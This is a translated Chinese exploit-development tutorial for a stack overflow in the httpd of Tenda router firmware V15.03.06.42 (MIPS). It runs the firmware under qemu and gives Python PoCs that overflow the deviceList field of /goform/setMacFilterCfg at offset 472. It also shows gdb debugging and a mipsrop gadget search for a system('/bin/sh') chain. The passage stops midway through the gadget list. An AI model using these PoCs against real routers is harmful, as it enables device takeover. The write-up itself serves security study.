# 对tenda(V15.03.06.42_mips)进行getshell
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
第一次对mips架构的路由器进行分析，整体来说和arm架构的差不多，但是rop利用起来要更加繁琐一点，需要利用到的软件有ida的插件mipsrop。
## mips架构简介
###  寄存器
寄存器 | 名字 | 用法  
---|---|---  
$0 | $zero | 常量0(constant value 0)  
$1 | $at | 保留给汇编器(Reserved for assembler)  
$2-$3 | $v0-$v1 | 函数调用返回值(values for results and expression evaluation)  
$4-$7 | $a0-$a3 | 函数调用参数(arguments)  
$8-$15 | $t0-$t7 | 暂时的(或随便用的)  
$16-$23 | $s0-$s7 | 保存的(或如果用，需要SAVE/RESTORE的)(saved)  
$24-$25 | $t8-$t9 | 暂时的(或随便用的)  
$28 | $gp | 全局指针(Global Pointer)  
$29 | $sp | 堆栈指针(Stack Pointer)  
$30 | $fp | 帧指针(Frame Pointer)  
$31 | $ra | 返回地址(return address)  
以上即为在mips架构中用到的寄存器以及寄存器的作用。这边重点讲一下$ra、$a0这两个寄存器，因为$ra寄存器为函数的返回地址，进行栈溢出时需要对函数返回地址进行覆盖；$a0这个寄存器存放的数据为函数的第一个参数，例如在函数system(“/bin/sh”)中，$a0寄存器存放的值即为”/bin/sh”，这给我们在gadget构造中具有指向作用。
## 固件分析
###  程序patch
和所有的tenda固件一样，该固件也需要进行patch以便运行，首先找到main函数：
与arm架构不同的是这里一共有三处需要进行patch，为了更好地讲解，tab查看伪代码：
这边一共有三处if语句，都必须符合才可以让程序跑起来，具体patch完的程序如下：
开始运行之前需要在将qemu-mipsel-static复制到固件模拟根目录下，运行命令：
    cp $(which qemu-mipsel-static) .
    sudo chroot ./ ./qemu-mipsel-static ./bin/httpd
这里两处提示无法创建文件，查看proc目录下，发现为空，根据提示创建文件即可，创建完文件夹之后，再次运行，发现可以正常运行：
###  漏洞函数分析
直接贴出漏洞存在的函数，采用倒序分析法进行分析：
由于在这strcpy函数中，并未对字符串进行检查，可以导致栈溢出，具体的漏洞分析方法，参考该文章：
###  漏洞触发
这一步原以为和arm架构的一样时，出现了问题，贴出我第一次用于触发漏洞的poc：
    import requests
    from pwn import *
    url = "http://192.168.5.6/goform/setMacFilterCfg"
    cookie = {"Cookie":"password=12345"}
    data = {"macFilterType": "white", "deviceList":"\r" +  "A" * 500}
    requests.post(url, cookies=cookie, data=data)
然后使用gdb-multiarch进行调试：
发现程序并没有按照预期那样的被“AAAA”覆盖掉了返回地址，而是跑到了strlen函数中，最终停了下来，这是个非预期的错误，所以果断开始进行动态调试。在动态调试之前介绍一下strcpy这个函数的特点，这个函数的特点就是在遇到”\x00”会被截断，所以在构造payload的时候一定要注意payload中绝不可以有”\x00”这一字节。
在动态调试之前先进行静态分析一下：
这边对栈溢出字符以及存放栈溢出字符串的地址进行了加载，调试的重点就是进入strcpy函数查看存放栈溢出字符串的地址里的内容：
在jalr处下断点，运行：
然后输入si命令，进入到strcpy函数中，disassemble命令查看该段汇编指令：
关键函数在于这三行：
    0x7f561230 :    lbu    a0,0(a1)
    0x7f561234 :    addiu    a1,a1,1
    0x7f561238 :    bnez    a0,0x7f56122c 
这三行进行了copy的操作，断点下在0x7f561238：
继续运行：
这样就完成了对第一个字符的strcpy，输入命令si，继续运行：
发现这边是将溢出字符放入到了$v1中，通过”x/x $v1”命令查看内存中的内容：
发现已经成功复制进去了第一个字符，通过”x/160wx $v1”命令查看内存中更多的内容：
由于$v1寄存器的值会加一，所以这里设置一个base地址：
    set $base = $v1
这样就可以通过命令”x/160wx $base”查看内存中的内容：
通过观察$base中的地址，在这个地方发现了return地址：
这个其实就是pwn3的地址，如果这里有不理解的话，可以进行静态调试，打开pwn3函数：
在pwn3函数中引用了pwn2函数，在pwn2函数中又引用了pwn1函数，在pwn1函数执行完之后会重新跳转到pwn2函数中，执行完之后又会继续跳转到pwn3函数中，所以这里保存了要继续跳转到pwn3中的地址，查看汇编后发现，的确如此，保存的地址为调用pwn2之后的第二句汇编指令的地址（因为第一句是nop）：
至此，找到了溢出的大小：0x7ffff0cc – 0x7fffeef4 = 0x1d8 = 472。
验证溢出字符长度，修改poc为：
    import requests
    from pwn import *
    url = "http://192.168.5.6/goform/setMacFilterCfg"
    cookie = {"Cookie":"password=12345"}
    data = {"macFilterType": "white", "deviceList":"\r" +  "A" * 472 + "BBBB"}
    requests.post(url, cookies=cookie, data=data)
再次发送poc：
符合poc中”BBBB”，说明覆盖返回地址成功。这里埋下一个伏笔，暂时就为什么多覆盖之后会报错卖个关子。
###  gadget利用思路
在讲解mips
gadget之前，一定要介绍一款插件，就是ida的mipsrop，这款可以很好地寻找mips中的gadget，ROPgadget对于mips来说支持度不是特别高。这里就mipsrop如何安装不做过多的赘述。
在通过mipsrop寻找gadget之前，介绍几个常见的gadget，在libc中，scandir和scandir64函数的末尾有大量的lw处理：
这个gadget的好处在于可以控制$ra，这样就可以控制跳转函数了，这里的利用思路为，将$ra覆盖为第二个gadget，在$sXX寄存中分别覆盖system地址和binsh的地址，然后跳转至gadget2中，将binsh的地址传给$a0，随后跳转至system函数，即可完成getshell。这里，我们确定一个传参给$a0的寄存器，我选择的是$s1，则直接搜索：
    Python>mipsrop.find("move $a0 $s1")
    --------------------------------------------------------------    |  Address     |  Action         |  Control Jump             |
    --------------------------------------------------------------    |  0x0000AB9C  |  move $a0,$s1   |  jalr  $s2                |
    |  0x0000ABA4  |  move $a0,$s1   |  jalr  $s2                |
    |  0x0000F54C  |  move $a0,$s1   |  jalr  $s6                |
    |  0x00011ABC  |  move $a0,$s1   |  jalr  $s4                |
    |  0x0001822C  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00018234  |  move $a0,$s1   |  jalr  $s2                |
    |  0x000183B8  |  move $a0,$s1   |  jalr  $s3                |
    |  0x000183C0  |  move $a0,$s1   |  jalr  $s3                |
    |  0x00019080  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00019088  |  move $a0,$s1   |  jalr  $s2                |
    |  0x0001920C  |  move $a0,$s1   |  jalr  $s3                |
    |  0x00019214  |  move $a0,$s1   |  jalr  $s3                |
    |  0x0001C48C  |  move $a0,$s1   |  jalr  $s5                |
    |  0x0001C4B8  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00022690  |  move $a0,$s1   |  jalr  $a2                |
    |  0x0002605C  |  move $a0,$s1   |  jalr  $s2                |
    |  0x0002A868  |  move $a0,$s1   |  jalr  $s2                |
    |  0x0002D4EC  |  move $a0,$s1   |  jalr  $s6                |
    |  0x0002D9B0  |  move $a0,$s1   |  jalr  $s6                |
    |  0x0002E510  |  move $a0,$s1   |  jalr  $s3                |
    |  0x0002FB28  |  move $a0,$s1   |  jalr  $s3                |
    |  0x0002FB68  |  move $a0,$s1   |  jalr  $s3                |
    |  0x00031EA4  |  move $a0,$s1   |  jalr  $s0                |
    |  0x0003751C  |  move $a0,$s1   |  jalr  $s4                |
    |  0x00037608  |  move $a0,$s1   |  jalr  $s5                |
    |  0x00037628  |  move $a0,$s1   |  jalr  $s5                |
    |  0x000376BC  |  move $a0,$s1   |  jalr  $s5                |
    |  0x00037700  |  move $a0,$s1   |  jalr  $fp                |
    |  0x0003787C  |  move $a0,$s1   |  jalr  $s6                |
    |  0x00037964  |  move $a0,$s1   |  jalr  $s5                |
    |  0x00037A2C  |  move $a0,$s1   |  jalr  $s5                |
    |  0x0003E8F8  |  move $a0,$s1   |  jalr  $s4                |
    |  0x0003E918  |  move $a0,$s1   |  jalr  $s3                |
    |  0x0003FE24  |  move $a0,$s1   |  jalr  $s4                |
    |  0x0003FE44  |  move $a0,$s1   |  jalr  $s3                |
    |  0x00040A08  |  move $a0,$s1   |  jalr  $s6                |
    |  0x00040D90  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00040DA4  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00043BFC  |  move $a0,$s1   |  jalr  $s7                |
    |  0x00043C10  |  move $a0,$s1   |  jalr  $s6                |
    |  0x00043C4C  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00043C68  |  move $a0,$s1   |  jalr  $s5                |
    |  0x000448CC  |  move $a0,$s1   |  jalr  $s5                |
    |  0x00045C6C  |  move $a0,$s1   |  jalr  $s7                |
    |  0x00045E68  |  move $a0,$s1   |  jalr  $fp                |
    |  0x00046514  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046550  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046578  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046590  |  move $a0,$s1   |  jalr  $s2                |
    |  0x000465A8  |  move $a0,$s1   |  jalr  $s2                |
    |  0x000465C4  |  move $a0,$s1   |  jalr  $s2                |
    |  0x000465DC  |  move $a0,$s1   |  jr    $s2                |
    |  0x00046830  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046848  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046860  |  move $a0,$s1   |  jr    $s2                |